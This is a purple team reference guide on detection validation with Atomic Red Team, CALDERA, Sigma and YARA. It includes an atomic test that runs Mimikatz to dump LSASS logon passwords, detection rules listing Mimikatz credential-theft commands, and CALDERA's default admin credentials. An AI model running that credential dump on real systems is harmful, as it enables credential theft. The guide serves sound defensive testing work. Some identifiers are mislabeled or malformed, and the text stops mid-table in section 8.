# Purple Team Reference

> **Adversary emulation, detection validation, Atomic Red Team, CALDERA, Sigma rules,
> BAS tools, ATT&CK Navigator coverage, and continuous purple team programs.**

---

## Table of Contents

1. [Purple Team Fundamentals](#1-purple-team-fundamentals)
2. [MITRE ATT&CK Navigator Usage](#2-mitre-attck-navigator-usage)
3. [Atomic Red Team](#3-atomic-red-team)
4. [CALDERA — Adversary Emulation Platform](#4-caldera--adversary-emulation-platform)
5. [Detection Validation Framework](#5-detection-validation-framework)
6. [Sigma Rules for Detection Validation](#6-sigma-rules-for-detection-validation)
7. [Breach and Attack Simulation (BAS) Tools](#7-breach-and-attack-simulation-bas-tools)
8. [Purple Team Exercise Planning](#8-purple-team-exercise-planning)
9. [Detection Engineering Workflow](#9-detection-engineering-workflow)
10. [VECTR — Purple Team Tracking](#10-vectr--purple-team-tracking)
11. [Adversary Emulation Plans](#11-adversary-emulation-plans)
12. [Key Resources](#12-key-resources)

---

## 1. Purple Team Fundamentals

### What Is a Purple Team?

A purple team combines **red team offensive techniques** with **blue team detection
validation** into a single collaborative effort. The red side executes techniques;
the blue side verifies whether detection, alerting, and response capabilities work as
expected. The result is direct, evidence-based feedback on the effectiveness of the
security program.

| Dimension | Red Team | Purple Team |
|-----------|----------|-------------|
| Goal | Test without revealing | Improve detection together |
| Output | Executive report (delayed) | Immediate detection coverage gaps |
| Frequency | Annual or semi-annual | Continuous |
| Feedback loop | Slow (weeks/months) | Fast (minutes) |
| Blue team awareness | Blind | Informed and participating |

### Why Purple Teams Matter

- The gap between what attackers do and what defenders detect is the primary risk driver.
- A SIEM with 10,000 rules is worthless if none of them fire on real attacker techniques.
- Purple teaming is the only way to empirically measure detection coverage.
- It converts threat intelligence into actionable detection improvements.

### Purple Team Maturity Model

| Level | Name | Description |
|-------|------|-------------|
| 1 | **Ad hoc** | Occasional knowledge sharing between red and blue; no structure |
| 2 | **Structured** | Planned exercises with defined scope, schedule, and documentation |
| 3 | **Continuous** | Ongoing validation pipeline — detection-as-code + automated testing |
| 4 | **Optimized** | Threat-intel driven; automated detection validation in CI/CD; coverage heatmap maintained in real time |

### Core Output of a Purple Team Exercise

- Detection coverage heatmap (ATT&CK Navigator layer)
- List of undetected techniques with root cause analysis
- Tuned alert thresholds and reduced false positives
- Closed visibility gaps (missing log sources, rule gaps, sensor blind spots)
- Updated detection rules with confirmed true-positive evidence
- Re-test schedule with owners assigned to each gap

### Continuous Purple Team Loop

```
Threat Intel
     │
     ▼
ATT&CK Mapping
     │
     ▼
Emulate Technique ──► Check SIEM ──► Detected? ──YES──► Document (green)
     │                                   │
     │                                   NO
     │                                   │
     │                              Root Cause Analysis
     │                                   │
     │                              Create/Tune Rule
     │                                   │
     │                              Re-Test
     │                                   │
     └────────────────────────────────── ▲
```

---

## 2. MITRE ATT&CK Navigator Usage

### ATT&CK Navigator Overview

**URL:** https://mitre-attack.github.io/attack-navigator/

The ATT&CK Navigator is a web-based tool for annotating and exploring the ATT&CK matrix.
It is the primary visualization layer for purple team coverage tracking.

### Creating a Coverage Layer

1. Open the Navigator
2. Create a new layer → select domain (Enterprise / ICS / Mobile)
3. Add a layer for **"What threat actor does"** (color: red)
4. Add a layer for **"What we detect"** (color: green)
5. Use layer comparison to find gaps

**Color convention:**

| Color | Meaning |
|-------|---------|
| Red | No detection whatsoever |
| Orange | Partially logged (events appear in SIEM but no rule exists) |
| Yellow | Rule exists but fires inconsistently or at wrong severity |
| Green | Alert fires with appropriate severity and response playbook exists |

### Threat-Intel Driven Prioritization Workflow

1. Identify threat actors targeting your sector
   - CISA advisories and Joint Cybersecurity Advisories
   - ISAC threat intelligence feeds (FS-ISAC, H-ISAC, etc.)
   - Mandiant M-Trends, CrowdStrike Global Threat Report, Secureworks CTIR
2. Pull ATT&CK Group pages for relevant actors
   - APT29 (Cozy Bear) — T1566, T1195, T1059.001, T1003.001, T1550.002, T1048
   - Lazarus Group — T1189, T1059.001, T1055, T1083, T1005, T1041
   - FIN7 — T1566.001, T1059.001, T1547.001, T1003, T1021.002
   - ALPHV/BlackCat — T1486, T1490, T1489, T1562.001, T1070.004
3. Map TTPs to ATT&CK Navigator layer
4. Identify gaps where detections do not exist
5. Run purple team exercises against those specific techniques
6. Close gaps and re-run

### ATT&CK STIX Data (Programmatic Use)

```python
# Download ATT&CK STIX data
# https://github.com/mitre/cti

import requests, json

url = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
stix = requests.get(url).json()

# Extract all techniques
techniques = [
    obj for obj in stix["objects"]
    if obj["type"] == "attack-pattern"
    and not obj.get("x_mitre_deprecated", False)
]

print(f"Total techniques: {len(techniques)}")

# Get technique by ID
def get_technique(techniques, tid):
    for t in techniques:
        for ref in t.get("external_references", []):
            if ref.get("external_id") == tid:
                return t
    return None

t = get_technique(techniques, "T1059.001")
print(t["name"])           # Command and Scripting Interpreter: PowerShell
print(t["description"])
```

### ATT&CK Navigator Layer JSON (Programmatic Creation)

```python
import json

layer = {
    "name": "Purple Team Exercise - 2024-Q1",
    "versions": {"attack": "14", "navigator": "4.9.5", "layer": "4.5"},
    "domain": "enterprise-attack",
    "description": "Coverage after Q1 2024 purple team exercise",
    "filters": {"platforms": ["Windows", "Linux", "macOS"]},
    "gradient": {
        "colors": ["#ff6666", "#ffe766", "#8ec843"],
        "minValue": 0,
        "maxValue": 100
    },
    "techniques": [
        {"techniqueID": "T1059.001", "score": 100, "comment": "Detected via PowerShell block logging + Sigma rule"},
        {"techniqueID": "T1003.001", "score": 50,  "comment": "Logged only — LSASS access events present but no alert"},
        {"techniqueID": "T1021.002", "score": 0,   "comment": "BLIND — no detection for lateral SMB/PsExec"},
    ]
}

with open("coverage_layer.json", "w") as f:
    json.dump(layer, f, indent=2)
```

---

## 3. Atomic Red Team

### Overview

Atomic Red Team is a framework by **Red Canary** consisting of small, focused tests
(called "atoms") that each emulate a single ATT&CK technique. The library contains
hundreds of tests for Windows, Linux, and macOS.

- **Repository:** https://github.com/redcanaryco/atomic-red-team
- **Test library:** https://atomicredteam.io/atomics/

### Invoke-AtomicRedTeam (PowerShell Framework)

```powershell
# ── Installation ──────────────────────────────────────────────────────────────
Install-Module -Name invoke-atomicredteam, powershell-yaml -Scope CurrentUser -Force
Import-Module invoke-atomicredteam

# Set the path to your cloned Atomic Red Team repo
$PSDefaultParameterValues = @{"Invoke-AtomicTest:PathToAtomicsFolder" = "C:\AtomicRedTeam\atomics"}

# ── Exploration ───────────────────────────────────────────────────────────────
# List all tests for a technique (brief)
Invoke-AtomicTest T1059.001 -ShowDetailsBrief

# List all tests with full details
Invoke-AtomicTest T1059.001 -ShowDetails

# ── Execution ─────────────────────────────────────────────────────────────────
# Run all tests for technique
Invoke-AtomicTest T1059.001

# Run specific test number
Invoke-AtomicTest T1059.001 -TestNumbers 1

# Run with custom input arguments
Invoke-AtomicTest T1003.001 -InputArgs @{"output_file" = "C:\temp\lsass.dmp"}

# Check prerequisites before running
Invoke-AtomicTest T1218.011 -CheckPrereqs     # Signed binary proxy execution (Rundll32)

# Get prerequisites (auto-install dependencies)
Invoke-AtomicTest T1218.011 -GetPrereqs

# ── Cleanup ───────────────────────────────────────────────────────────────────
# Clean up artifacts after test
Invoke-AtomicTest T1059.001 -Cleanup

# Clean up specific test
Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup

# ── Logging ───────────────────────────────────────────────────────────────────
# Log results to CSV
Invoke-AtomicTest T1059.001 -LoggingModule "Attire-ExecutionLogger" `
    -ExecutionLogPath "C:\Logs\atomic_results.csv"
```

### High-Value Atomic Tests for Purple Teams

| ATT&CK ID | Name | Platform | Detection Focus |
|-----------|------|----------|-----------------|
| T1059.001 | PowerShell | Windows | PowerShell block logging, script block logging |
| T1059.003 | cmd.exe | Windows | Command-line auditing, process creation |
| T1003.001 | LSASS Memory | Windows | Process access to lsass.exe, WDigest |
| T1003.002 | SAM dump | Windows | Registry access to HKLM\SAM |
| T1053.005 | Scheduled Tasks | Windows | Schtasks.exe, EventID 4698 |
| T1547.001 | Run Keys | Windows | Registry HKCU\...\Run modifications |
| T1548.002 | UAC Bypass | Windows | Auto-elevated process without UAC prompt |
| T1558.003 | Kerberoasting | Windows | 4769 (TGS request, RC4 encryption) |
| T1021.002 | SMB/PsExec | Windows | 4624 logon type 3, service creation |
| T1021.006 | WinRM | Windows | 4624 logon type 3, wsmprovhost.exe |
| T1550.002 | Pass-the-Hash | Windows | 4624 NTLMv2, unusual source IP |
| T1070.001 | Clear Windows EventLog | Windows | EventID 1102, wevtutil.exe |
| T1140 | Deobfuscate/Decode | Windows | certutil.exe -decode, msiexec |
| T1041 | Exfil over C2 | Windows/Linux | Unusual outbound HTTP/DNS volumes |
| T1083 | File/Dir Discovery | Windows/Linux | Mass file enumeration in short window |

### Atomic Test YAML Structure

```yaml
attack_technique: T1059.001
display_name: "Command and Scripting Interpreter: PowerShell"
atomic_tests:
  - name: Mimikatz — Credentials Dump All Logon Passwords
    description: |
      Dumps credentials from LSASS memory using Mimikatz sekurlsa module.
      Requires elevation.
    supported_platforms:
      - windows
    input_arguments:
      mimikatz_path:
        description: Path to mimikatz executable
        type: path
        default: PathToAtomicsFolder\T1003.001\bin\mimikatz.exe
      output_file:
        description: Path to save output
        type: path
        default: C:\Windows\Temp\mimikatz_output.txt
    executor:
      name: command_prompt
      elevation_required: true
      command: |
        #{mimikatz_path} "privilege::debug" "sekurlsa::logonpasswords" exit > #{output_file}
    cleanup_command: |
      del /f /q #{output_file} 2>nul
```

### Custom Atomic Tests

Organizations can write their own atomic tests for internal tools or processes:

```yaml
attack_technique: T1078.002
display_name: "Valid Accounts: Domain Accounts"
atomic_tests:
  - name: Login with service account credentials
    description: |
      Simulates an attacker using a stolen service account credential.
      Custom test specific to our environment.
    supported_platforms:
      - windows
    input_arguments:
      username:
        description: Service account username
        type: string
        default: svc-backup
      domain:
        description: Domain name
        type: string
        default: corp.local
    executor:
      name: powershell
      elevation_required: false
      command: |
        $cred = Get-Credential -UserName "#{domain}\#{username}" -Message "Enter password"
        Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
```

### CI/CD Integration for Automated Detection Validation

```yaml
# GitHub Actions example — runs atomics against staging, checks SIEM for detection
name: Detection Validation

on:
  schedule:
    - cron: "0 2 * * 1"   # every Monday at 2 AM
  workflow_dispatch:

jobs:
  validate-detections:
    runs-on: [self-hosted, windows-staging]
    steps:
      - name: Install Invoke-AtomicRedTeam
        shell: pwsh
        run: |
          Install-Module invoke-atomicredteam, powershell-yaml -Force -Scope CurrentUser

      - name: Run T1059.001 Atomic Test
        shell: pwsh
        run: |
          Import-Module invoke-atomicredteam
          Invoke-AtomicTest T1059.001 -TestNumbers 1
          Start-Sleep -Seconds 30    # wait for log ingestion

      - name: Check SIEM for Detection
        shell: python
        run: |
          import requests, sys, json, datetime
          # Query Splunk for the expected alert
          resp = requests.get(
              "https://splunk.corp.local:8089/services/search/jobs/export",
              params={
                  "search": 'search index=windows source=WinEventLog:Security EventCode=4103 | stats count',
                  "earliest_time": "-5m",
                  "output_mode": "json"
              },
              auth=("admin", "${{ secrets.SPLUNK_PASSWORD }}"),
              verify=False
          )
          count = sum(int(r.get("count",0)) for r in resp.json().get("results",[]))
          if count == 0:
              print("FAIL: T1059.001 PowerShell not detected in SIEM!")
              sys.exit(1)
          print(f"PASS: {count} detection events found")

      - name: Cleanup
        shell: pwsh
        if: always()
        run: |
          Import-Module invoke-atomicredteam
          Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup
```

---

## 4. CALDERA — Adversary Emulation Platform

### Overview

CALDERA is MITRE's open-source adversary emulation platform. It provides a
server-based architecture for running automated and semi-automated ATT&CK-mapped
operations through deployed agents.

- **Repository:** https://github.com/mitre/caldera
- **Documentation:** https://caldera.readthedocs.io

### Architecture

```
┌─────────────────────────────────────────────────────┐
│                 CALDERA Server                       │
│  ┌──────────┐  ┌──────────┐  ┌───────────────────┐  │
│  │  Planner │  │ Plugins  │  │  REST API / Web UI │  │
│  └──────────┘  └──────────┘  └───────────────────┘  │
└──────────────────────────┬──────────────────────────┘
                           │ C2 over HTTP/S or DNS
          ┌────────────────┼────────────────┐
          ▼                ▼                ▼
     Agent (Sandcat)  Agent (Manx)   Agent (Ragdoll)
     Windows           Windows        macOS / Linux
```

### Installation and Startup

```bash
# Clone and install
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip3 install -r requirements.txt

# Start server (development mode)
python3 server.py --insecure

# Start with SSL
python3 server.py --ssl

# Start with specific config
python3 server.py --config conf/default.yml
```

**Default credentials:**
| Role | Username | Password |
|------|----------|----------|
| Admin | admin | admin |
| Red | red | admin |
| Blue | blue | admin |

**Web UI:** http://localhost:8888

### Key Plugins

| Plugin | Purpose |
|--------|---------|
| **Stockpile** | 400+ pre-built abilities mapped to ATT&CK techniques |
| **Emu** | Adversary emulation profiles (APT29, FIN6, menuPass) |
| **Atomic** | Integration with Atomic Red Team test library |
| **Compass** | Generates ATT&CK Navigator layers from operation results |
| **Human** | Simulates realistic user behavior (browse, type, click) |
| **Debrief** | Operation reporting and gap analysis |
| **Manx** | Reverse shell agent (TCP) |
| **Ragdoll** | macOS agent |
| **Response** | Automated defender responses to detections |

### CALDERA REST API — Python Examples

```python
import requests, json

BASE = "http://localhost:8888"
HEADERS = {"KEY": "ADMIN123"}   # replace with your API key from conf/default.yml

# ── List adversaries ──────────────────────────────────────────────────────────
adversaries = requests.get(
    f"{BASE}/api/v2/adversaries", headers=HEADERS
).json()
for adv in adversaries:
    print(adv["adversary_id"], adv["name"])

# ── List abilities (techniques) ───────────────────────────────────────────────
abilities = requests.get(f"{BASE}/api/v2/abilities", headers=HEADERS).json()
print(f"Total abilities: {len(abilities)}")

# ── List agents (connected endpoints) ────────────────────────────────────────
agents = requests.get(f"{BASE}/api/v2/agents", headers=HEADERS).json()
for a in agents:
    print(a["paw"], a["host"], a["platform"])

# ── Create an operation ───────────────────────────────────────────────────────
op_payload = {
    "name": "Purple Team Q1",
    "adversary": {"adversary_id": "APT29_ID"},
    "planner": {"id": "atomic"},
    "group": "red",
    "auto_close": True,
    "state": "running"
}
op = requests.post(
    f"{BASE}/api/v2/operations",
    headers={**HEADERS, "Content-Type": "application/json"},
    json=op_payload
).json()
print(f"Operation ID: {op['id']}")

# ── Get operation results ─────────────────────────────────────────────────────
results = requests.get(
    f"{BASE}/api/v2/operations/{op['id']}/links",
    headers=HEADERS
).json()
for link in results:
    print(link["ability"]["technique_id"], link["status"], link["output"])
```

### Building a Custom Adversary Profile

```yaml
# caldera/data/adversaries/custom_apt.yml
id: custom-apt-001
name: Custom APT Emulation
description: Simulates a financially motivated threat actor
objective: ed32b9c3-9593-4c33-b0db-e2007315096b
tags: []
atomic_ordering:
  - 9a30740d-3aa8-4c23-8efa-d51215e8a5b5   # PowerShell download cradle
  - 3b2e6d4a-5f1c-4a8b-9d0e-7c6f2a1e8b3c   # Credential dump (LSASS)
  - 4c3d2e1f-6a5b-4c8d-9e0f-1a2b3c4d5e6f   # Lateral movement via SMB
  - 5e4d3c2b-7b6a-4d9e-0f1g-2b3c4d5e6f7g   # Data staging
  - 6f5e4d3c-8c7b-4e0f-1g2h-3c4d5e6f7g8h   # Exfiltration via HTTPS
```

### CALDERA Operation Results → ATT&CK Navigator Layer

```python
import requests, json

BASE = "http://localhost:8888"
HEADERS = {"KEY": "ADMIN123"}

# Fetch operation results
op_id = "your-operation-id"
links = requests.get(f"{BASE}/api/v2/operations/{op_id}/links", headers=HEADERS).json()

# Build Navigator layer
techniques = {}
for link in links:
    tid = link["ability"]["technique_id"]
    status = link["status"]
    if tid not in techniques:
        techniques[tid] = {"detected": False, "ran": False}
    if status == 0:    # success
        techniques[tid]["ran"] = True

# Compare with SIEM detections (from your SIEM API)
# ... (query your SIEM here) ...

layer_techniques = []
for tid, data in techniques.items():
    score = 100 if data.get("detected") else (50 if data["ran"] else 0)
    layer_techniques.append({"techniqueID": tid, "score": score})

layer = {
    "name": f"CALDERA Operation {op_id}",
    "versions": {"attack": "14"},
    "domain": "enterprise-attack",
    "techniques": layer_techniques
}
print(json.dumps(layer, indent=2))
```

---

## 5. Detection Validation Framework

### Detection Validation Pipeline

A systematic, repeatable process to close the gap between attacker capability and
defensive detection:

```
Step 1: ENUMERATE
  └─ Which ATT&CK techniques apply to your threat model?
  └─ Prioritized by threat intel (see Section 2)

Step 2: EMULATE
  └─ Run Atomic Red Team test or CALDERA operation
  └─ Record: timestamp, technique, tool used, exact command

Step 3: CHECK SIEM
  └─ Did an alert fire? Did a log even appear?
  └─ Check within 5–10 minutes of execution

Step 4: CLASSIFY
  └─ Prevent   — blocked before execution
  └─ Alert     — SIEM alert fired with correct severity
  └─ Detect    — logs present, searchable, but no automated alert
  └─ Blind     — no telemetry at all

Step 5: REMEDIATE
  └─ Missing log source → enable logging (Sysmon, PowerShell block logging, etc.)
  └─ Missing rule → write Sigma rule → deploy to SIEM
  └─ Wrong severity → tune rule
  └─ Too noisy → add exception

Step 6: RE-TEST
  └─ Re-run the same atomic test
  └─ Confirm detection fires

Step 7: TRACK
  └─ Update ATT&CK Navigator layer
  └─ Maintain detection coverage scorecard
```

### Coverage Classification Definitions

| Classification | Definition | Action |
|----------------|------------|--------|
| **Prevent** | Security control (EDR, NGFW, app control) blocks the technique before it completes | Validate prevention is consistent across all endpoints |
| **Alert** | SIEM alert fires with severity ≥ Medium within acceptable TTD window | Tune severity, verify response playbook exists |
| **Detect** | Log events exist in SIEM and are searchable but no automated alert rule fires | Write alert rule from existing log evidence |
| **Blind spot** | No telemetry, no alert, no way to investigate after the fact | Enable log source first, then write detection |

### Detection Coverage Scorecard Template

| Tactic | Technique | Description | Atomic Test | Prevent | Alert | Detect | Blind | Notes |
|--------|-----------|-------------|-------------|---------|-------|--------|-------|-------|
| Initial Access | T1566.001 | Spear-phishing attachment | Macro payload | N | Y | Y | N | Alert only fires on macro execution, not delivery |
| Execution | T1059.001 | PowerShell | Encoded command | N | Y | Y | N | Block logging enabled |
| Execution | T1059.003 | cmd.exe | LOLBin abuse | N | N | Y | N | Need alert rule for suspicious cmd args |
| Persistence | T1053.005 | Scheduled task creation | schtasks.exe | N | Y | Y | N | EventID 4698 alert active |
| Persistence | T1547.001 | Run Key | reg.exe add | N | N | Y | N | Sysmon logs exist, no alert |
| Privilege Escalation | T1548.002 | UAC Bypass | fodhelper | N | N | N | Y | No Sysmon rule for fodhelper |
| Credential Access | T1003.001 | LSASS dump | mimikatz | N | Y | Y | N | LSASS PPL not enabled |
| Credential Access | T1558.003 | Kerberoasting | Rubeus | N | N | Y | N | 4769 events present, no alert |
| Lateral Movement | T1021.002 | SMB/PsExec | psexec.py | N | N | Y | N | Need lateral movement alert |
| Lateral Movement | T1550.002 | Pass-the-Hash | mimikatz pth | N | N | N | Y | NTLMv2 events not centralized |
| Collection | T1005 | Local data staging | robocopy | N | N | N | Y | No file access telemetry |
| Exfiltration | T1041 | C2 channel exfil | Cobalt Strike | N | N | Y | N | DNS tunnel blind spot |

### Coverage Metrics Dashboard

Track these metrics over time to demonstrate improvement:

| Metric | Formula | Target |
|--------|---------|--------|
| **ATT&CK Coverage %** | (Techniques with ≥1 rule / Total techniques tested) × 100 | >70% |
| **Alert Coverage %** | (Techniques that trigger alert / Total techniques tested) × 100 | >50% |
| **Blind Spot Rate** | (Blind techniques / Total techniques tested) × 100 | <15% |
| **Mean TTD** | Median(time of alert − time of execution) | <5 min |
| **Alert Fidelity** | True positives / (True positives + False positives) | >80% |
| **Rule Backlog** | Count of techniques lacking a detection rule | Track trend |

### Log Source Checklist (Windows)

```powershell
# Enable PowerShell Script Block Logging
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -Name "EnableScriptBlockLogging" -Value 1 -Type DWord

# Enable PowerShell Module Logging
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" `
    -Name "EnableModuleLogging" -Value 1 -Type DWord

# Enable Process Command Line Auditing
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" `
    -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1

# Confirm Sysmon is running
Get-Service Sysmon64 | Select-Object Name, Status, StartType

# Check Windows Advanced Audit Policy
auditpol /get /category:*
```

---

## 6. Sigma Rules for Detection Validation

### Sigma Overview

Sigma is a **generic SIEM detection rule format** that can be converted to any SIEM
query language. Writing rules in Sigma means one rule works across Splunk, Elastic,
Microsoft Sentinel, QRadar, and others.

- **Repository:** https://github.com/SigmaHQ/sigma
- **Rule library:** https://github.com/SigmaHQ/sigma/tree/master/rules
- **pySigma:** https://github.com/SigmaHQ/pySigma

### Sigma Rule Structure

```yaml
title: Mimikatz Command Line Arguments
id: a8e65c88-e60d-4e1f-b15d-1e48ecf40a71
status: test
description: Detects Mimikatz command line arguments commonly used for credential dumping
references:
    - https://blog.gentilkiwi.com/mimikatz
    - https://github.com/gentilkiwi/mimikatz
author: Florian Roth
date: 2021/06/15
modified: 2023/09/01
tags:
    - attack.credential_access
    - attack.t1003.001
    - detection.threat_hunting
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - 'sekurlsa::'
            - 'kerberos::'
            - 'lsadump::'
            - 'privilege::debug'
            - 'crypto::'
            - 'dpapi::'
    condition: selection
falsepositives:
    - Penetration testing activity
    - Security tool testing
level: high
```

### Sigma Rule Field Reference

| Field | Purpose | Required |
|-------|---------|----------|
| `title` | Human-readable rule name | Yes |
| `id` | UUID for tracking | Yes |
| `status` | stable / test / experimental | Yes |
| `description` | What the rule detects | Yes |
| `author` | Rule author | Recommended |
| `date` | Creation date | Recommended |
| `modified` | Last modification | Recommended |
| `tags` | ATT&CK tags (attack.t####.###) | Recommended |
| `logsource` | category + product | Yes |
| `detection` | selection + condition | Yes |
| `falsepositives` | Known false positive scenarios | Recommended |
| `level` | critical / high / medium / low / informational | Yes |

### Sigma Detection Modifiers

```yaml
detection:
    selection_exact:
        FieldName: "exact value"
    selection_contains:
        FieldName|contains: "substring"
    selection_startswith:
        FieldName|startswith: "prefix"
    selection_endswith:
        FieldName|endswith: ".ps1"
    selection_re:
        FieldName|re: '^cmd\.exe\s+/c\s+'
    selection_cidr:
        SourceIP|cidr: "10.0.0.0/8"
    selection_all:
        FieldName|contains|all:
            - "value1"
            - "value2"
    selection_any:
        FieldName|contains:
            - "value1"
            - "value2"
    condition: selection_contains and not selection_exact
```

### Sigma to SIEM Conversion

```bash
# Install sigma-cli and backends
pip install sigma-cli pySigma-backend-splunk pySigma-backend-elastic \
    pySigma-backend-microsoft365defender pySigma-pipeline-windows

# Convert to Splunk SPL
sigma convert -t splunk -p splunk_windows \
    sigma/rules/windows/process_creation/proc_creation_win_mimikatz_commandline.yml

# Convert entire directory to Splunk
sigma convert -t splunk -p splunk_windows sigma/rules/windows/ \
    -o splunk_rules.conf

# Convert to Elasticsearch EQL
sigma convert -t elasticsearch -p ecs_windows -f eql \
    sigma/rules/windows/process_creation/

# Convert to Microsoft Sentinel KQL
sigma convert -t sentinel -p windows-audit \
    sigma/rules/windows/

# Convert to Elastic SIEM (NDJSON)
sigma convert -t elasticsearch -p ecs_windows -f kibana_ndjson \
    sigma/rules/windows/ -o rules.ndjson

# List available backends
sigma list backends

# List available pipelines
sigma list pipelines
```

### Writing a Sigma Rule from Atomic Test Output

```python
# Workflow:
# 1. Run atomic test -- observe what log fields are generated
# 2. Write Sigma rule targeting those specific fields
# 3. Convert to SIEM query and test

# Step 1: Run atomic (from PowerShell):
# Invoke-AtomicTest T1053.005 -TestNumbers 1
#
# Observe in Windows Event Log:
#   EventID: 4698 (A scheduled task was created)
#   SubjectUserName: CORP\jsmith
#   TaskName: \Microsoft\Windows\Update\Backdoor
#   TaskContent: <Actions><Exec><Command>powershell.exe</Command>...

# Step 2: Sigma rule targeting those fields
SIGMA_RULE = (
    "title: Suspicious Scheduled Task Creation via Schtasks\n"
    "status: test\n"
    "description: Detects schtasks.exe with suspicious command-line arguments\n"
    "tags:\n"
    "    - attack.persistence\n"
    "    - attack.t1053.005\n"
    "logsource:\n"
    "    category: process_creation\n"
    "    product: windows\n"
    "detection:\n"
    "    selection:\n"
    "        Image|endswith: '\\\\schtasks.exe'\n"
    "        CommandLine|contains: '/create'\n"
    "    condition: selection\n"
    "level: high\n"
)
print(SIGMA_RULE)
```

### YARA Rules for File-Based Detection Validation

```yara
rule Mimikatz_Strings {
    meta:
        description = "Detects Mimikatz binary based on characteristic strings"
        author = "Purple Team"
        date = "2024-01-15"
        reference = "https://github.com/gentilkiwi/mimikatz"
        mitre_attack = "T1003.001"
    strings:
        $s1 = "sekurlsa::logonpasswords" ascii wide
        $s2 = "privilege::debug" ascii wide
        $s3 = "mimikatz" ascii wide nocase
        $s4 = "gentilkiwi" ascii wide
        $s5 = { 6D 69 6D 69 6B 61 74 7A }   // "mimikatz" hex
    condition:
        3 of them
}

rule CobaltStrike_Beacon {
    meta:
        description = "Detects Cobalt Strike beacon by EICAR-like patterns"
        author = "Purple Team"
        mitre_attack = "T1071.001"
    strings:
        $cs1 = "%s as %s\\%s" ascii
        $cs2 = "beacon.x64.dll" ascii wide
        $sleep = { 68 58 13 00 00 }           // sleep(5000)
    condition:
        any of them
}
```

---

## 7. Breach and Attack Simulation (BAS) Tools

### Overview

BAS platforms automate adversary emulation continuously, without requiring human
red team operators. They complement purple team exercises by providing:

- Daily/weekly automated detection validation
- Continuous regression testing after SIEM rule changes
- Benchmark scoring over time
- Evidence for compliance and security program reporting

### Commercial BAS Platforms

| Platform | Focus | Notable Feature |
|----------|-------|----------------|
| **Cymulate** | SaaS BAS, full ATT&CK coverage | APT simulation + phishing + lateral movement + exfiltration vectors; MITER ATT&CK score |
| **AttackIQ** | ATT&CK-aligned, enterprise | Scenario library, deep SIEM/EDR integrations, prevention/detection scoring |
| **SafeBreach** | Playbook-based | 10,000+ attack playbooks, MITRE ATT&CK coverage heatmap |
| **Picus Security** | Threat-centric | Prevention score + detection score, vendor-specific content |
| **SCYTHE** | Threat emulation | Community threat library, custom emulation plans, C2 channels |
| **NodeZero** (Horizon3.ai) | Autonomous pentesting + BAS | Finds and chains real vulnerabilities, not just simulations |
| **Pentera** | Automated pentesting | Network-wide automated red team with impact scoring |

### Open Source BAS Alternatives

- **CALDERA** (MITRE) — see Section 4
- **Atomic Red Team** (Red Canary) — see Section 3
- **VECTR** (SRA) — purple team tracking, see Section 10
- **PurpleSharp** — C2-based ATT&CK test tool for Active Directory environments
- **Stratus Red Team** (Datadog) — cloud-focused ATT&CK emulation (AWS, GCP, Azure, Kubernetes)

```bash
# PurpleSharp example
.\PurpleSharp.exe /pb playbooks\lateral_movement.json /log sharplogs.json

# Stratus Red Team (Cloud)
stratus list                          # list available attack techniques
stratus detonate aws.execution.ec2-user-data   # run a technique
stratus cleanup aws.execution.ec2-user-data    # cleanup
```

### BAS Use Cases

| Use Case | Description |
|----------|-------------|
| **Continuous validation** | Run entire ATT&CK coverage suite daily; alert when detection score drops |
| **Change validation** | Run before/after SIEM rule changes to verify improvement |
| **New tool validation** | Validate EDR/SIEM before go-live using BAS evidence |
| **Regression testing** | Ensure new SIEM rules don't break existing detections |
| **Compliance evidence** | Automated evidence that controls are tested regularly |
| **Benchmarking** | Track MITRE ATT&CK coverage score over time across quarters |

---

## 8. Purple Team Exercise Planning

### Pre-Exercise Preparation

**1. Define objectives**
- Which ATT&CK tactics/techniques are in scope?
- Which threat actor are we emulating?
- What is the hypothesis? ("We believe we cannot detect T1003.001")

**2. Establish scope**
- Target systems: staging vs. production?
- Time window: when will tests run?
- Safety constraints: no destructive tests (T1485, T1486) in production
- Out-of-scope: critical systems, patient data, financial systems

**3. Team composition**
- 2–3 red operators (knows ATT&CK techniques, can execute Atomic tests)
- 2–3 blue analysts (SIEM access, detection rule experience)
- 1 facilitator (tracks gaps, time-keeps, records results)
- Optional: threat intelligence analyst (brief on relevant TTPs)

**4. Threat intelligence brief**
- Share relevant threat actor TTPs with both teams before the exercise
- "Today we are emulating APT29, known for T1566.001, T1059.001, T1003.001..."
- Both sides work together — not a test of blue team; a test of defenses

**5. White card system**
- Red team announces what technique they are about to execute
- Blue team arms detection query and watches for the event
- If not detected within 60 seconds → gap confirmed → document immediately

### During-Exercise Workflow

```
For each technique:

   Red: "About to run T1059.001 Test #1 — PowerShell encoded command"
   Blue: "Ready — watching for EventID 4103 in Splunk"

   Red: Execute atomic test
   Timer: 60-second detection window

   If detected:
     Blue: "Got it — fired at [timestamp], severity High, rule: PSEncodedCommand"
     Log: DETECTED ✓

   If not detected:
     Blue: "No alert — investigating..."

     Check 1: Is the log even present?
       → If NO log: missing log source (Sysmon? PowerShell logging?)
       → If log present: missing rule or wrong field mapping

     Log: BLIND or DETECT-ONLY

   Create ticket: [Technique] [Status] [Root cause] [Owner] [Due date]
   Move to next technique
```

### Post-Exercise Deliverables

**Detection gap report template:**

```markdown
## Purple Team Exercise — Gap Report
**Date:** 2024-01-15
**Facilitator:** [Name]
**Red Team:** [Names]
**Blue Team:** [Names]
**Techniques tested:** 22
**Detected:** 14 (64%)
**Logged only:** 5 (23%)
**Blind spots:** 3 (14%)

### Critical Gaps (Blind Spots)

| # | Technique | Description | Root Cause | Owner | Due Date |
|---|-----------|-------------|------------|-------|----------|
| 1 | T1550.002 | Pass-the-Hash | NTLMv2 events not forwarded to SIEM | SecOps | 2024-02-01 |
| 2 | T1041 | C2 exfil via DNS tunnel | DNS query logging not enabled | NetOps | 2024-02-01 |
